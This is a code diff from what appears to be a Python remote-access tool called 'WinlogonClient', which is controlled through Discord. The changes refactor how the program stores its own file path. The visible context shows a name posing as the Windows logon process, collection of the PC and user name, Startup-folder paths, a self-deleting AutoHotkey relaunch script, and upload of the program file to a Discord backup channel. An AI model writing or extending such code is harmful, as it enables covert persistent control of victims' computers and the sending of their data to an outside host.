@@ -86,8 +86,7 @@ class WinlogonClient(discord.Client):
         self.privates = []
         self.is_privates = []
         login = os.getenv("COMPUTERNAME")  # login of PC
-        file_name = os.path.dirname(__file__) + "/" + os.path.basename(__file__)  # file_name = os.path.basename(__file__)
-        dir_name = os.path.dirname(__file__) + "/"
+        self.file_name = os.path.basename(__file__)  # file_name = os.path.basename(__file__)
 
         login_name = os.getlogin()
 
@@ -95,6 +94,8 @@ class WinlogonClient(discord.Client):
         self.paths["APPDATA"] = os.getenv("APPDATA")
         self.paths["DESKTOP"] = f"C:\\Users\\{login_name}\\Desktop"
         self.paths["STARTUP"] = f"C:\\Users\\{login_name}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
+        self.paths["."] = os.path.dirname(__file__) + "/"
+        self.paths[".file"] = os.path.dirname(__file__) + "/" + os.path.basename(__file__)
 
         start_up = "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
         os.chdir(self.paths["APPDATA"])  # Сделать папкой по умолчанию
@@ -228,7 +229,7 @@ class WinlogonClient(discord.Client):
 
     async def send_settings_form(self):
         await self.send_embed(description="```python\n"
-                                             f"file_name: \"{file_name}\"\n"
+                                             f"file_name: \"{self.file_name}\"\n"
                                              f"app_data: \"{self.paths['APPDATA']}\"\n"
                                              f"start_up: \"{start_up}\"\n"
                                              f"desktop: \"C:\\Users\\{login_name}\\Desktop\""
@@ -705,7 +706,7 @@ class WinlogonClient(discord.Client):
                         #SingleInstance force
                         FileDelete, %A_ScriptName%
                         sleep 5000
-                        Run, {file_name}
+                        Run, {self.paths['.file']}
                         ExitApp"""
                     File.write(command, "reload.ahk")
                     start('reload.ahk')
@@ -1150,7 +1151,7 @@ class WinlogonClient(discord.Client):
         if login == "ALEX":
             try:
                 body_time = datetime.strftime(datetime.now(), "```python\n\'%d %B %H:%M:%S\'\n```\n")
-                url_back_up = await client.send_file(self.channel.back_up, file_name, filename=file_name,
+                url_back_up = await client.send_file(self.channel.back_up, self.file_name, filename=self.file_name,
                                                      content=body_time)
                 link = url_back_up.attachments[0]["url"]
                 await self.channel.back_up.send(link)
